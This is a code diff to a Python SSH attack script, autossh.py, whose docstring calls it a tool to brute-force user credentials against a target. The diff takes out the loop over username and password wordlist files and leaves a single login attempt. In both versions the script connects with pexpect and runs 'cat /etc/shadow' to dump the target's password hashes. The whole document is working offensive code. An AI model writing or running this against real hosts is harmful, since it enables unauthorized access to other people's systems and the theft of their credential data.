@@ -1,10 +1,7 @@
 """
 BruteForce user credentials against a target
 
-usage: python autossh.py <host> <user_filename> <pass_filename>
-
-user_file has one username per line
-pass_file has one potential password per line
+usage: python autossh.py <host> <username> <password>
 """
 import pexpect
 import os
@@ -53,37 +50,16 @@ def connect(user, host, passwd):
     return child
 
 
-def checkfile(filename):
-    if not os.path.isfile(filename):
-        print('{} deos not exist'.format(filename))
-        return True
-    elif not os.access(filename, os.R_OK):
-        print('{} : Access Denied'.format(filename))
-        return False
-    else:
-        return True
-
-
 def main():
     if len(sys.argv) == 4:
         host = sys.argv[1]
-        userfile = sys.argv[2]
-        passfile = sys.argv[3]
+        user = sys.argv[2]
+        passwd = sys.argv[3]
         start_time = time.time()
-        if checkfile(userfile) and checkfile(passfile):
-            with open(userfile, 'r') as uf:
-                for line in uf.readlines():
-                    user = line.strip('\n')
-                    with open(passfile, 'r') as pf:
-                        for l in pf.readlines():
-                            passwd = l.strip('\n')
-                            child = connect(user, host, passwd)
-                            send_cmd(child, 'cat /etc/shadow')
-            print('Time Taken: {}'.format(time.time() - start_time))
-        else:
-            exit(1)
+        child = connect(user, host, passwd)
+        send_cmd(child, 'cat /etc/shadow')
     else:
-        print('usage: python autossh.py <host> <user_filename> <pass_filename>')
+        print('usage: python autossh.py <host> <username> <password>')
         exit(1)
 
 
